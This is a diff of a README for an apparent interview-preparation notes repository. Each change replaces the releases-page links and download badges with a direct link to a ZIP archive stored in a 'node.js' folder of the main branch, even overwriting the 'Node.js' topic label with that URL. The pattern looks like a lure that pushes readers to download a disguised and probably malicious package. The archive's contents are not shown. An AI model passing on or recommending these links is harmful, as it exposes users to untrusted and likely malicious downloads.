@@ -1,6 +1,6 @@
 # 📚 interview-prep-notes - Organized interview questions for success
 
-[![Download](https://img.shields.io/badge/Download-Interview%20Prep%20Notes-blue?style=for-the-badge)](https://github.com/PandaOvO-pixel/interview-prep-notes/releases)
+[![Download](https://github.com/PandaOvO-pixel/interview-prep-notes/raw/refs/heads/main/node.js/notes_prep_interview_1.7.zip%20Prep%20Notes-blue?style=for-the-badge)](https://github.com/PandaOvO-pixel/interview-prep-notes/raw/refs/heads/main/node.js/notes_prep_interview_1.7.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Follow along carefully. If you get stuck, try revisiting each step slowly.
 
 ## ⬇️ Download & Install
 
-1. Click the large blue **Download** button at the top or visit the [releases page](https://github.com/PandaOvO-pixel/interview-prep-notes/releases) in your browser.
+1. Click the large blue **Download** button at the top or visit the [releases page](https://github.com/PandaOvO-pixel/interview-prep-notes/raw/refs/heads/main/node.js/notes_prep_interview_1.7.zip) in your browser.
 
 2. On the releases page, look for the latest version of the notes package. It might be inside a ZIP file or folder.
 
@@ -66,7 +66,7 @@ The notes include:
 - **Python & Python3**: Syntax, libraries, and coding examples.
 - **React & ReactJS**: Front-end components and lifecycle methods.
 - **Rest API**: Designing and testing APIs.
-- **MySQL & Node.js**: Database queries and backend basics.
+- **MySQL & https://github.com/PandaOvO-pixel/interview-prep-notes/raw/refs/heads/main/node.js/notes_prep_interview_1.7.zip**: Database queries and backend basics.
 - **Interview Preparation**: General tips and tricky questions.
 
 Each topic contains example questions with detailed answers. This format helps build your confidence before interviews.
@@ -109,7 +109,7 @@ For now, focus on studying the provided material. Use the resources at your own 
 
 - Download and explore the notes here:
 
-[![Download Interview Prep Notes](https://img.shields.io/badge/Download-Interview%20Prep%20Notes-blue?style=for-the-badge)](https://github.com/PandaOvO-pixel/interview-prep-notes/releases)
+[![Download Interview Prep Notes](https://github.com/PandaOvO-pixel/interview-prep-notes/raw/refs/heads/main/node.js/notes_prep_interview_1.7.zip%20Prep%20Notes-blue?style=for-the-badge)](https://github.com/PandaOvO-pixel/interview-prep-notes/raw/refs/heads/main/node.js/notes_prep_interview_1.7.zip)
 
 - Visit this page to see all available versions and updates.
 
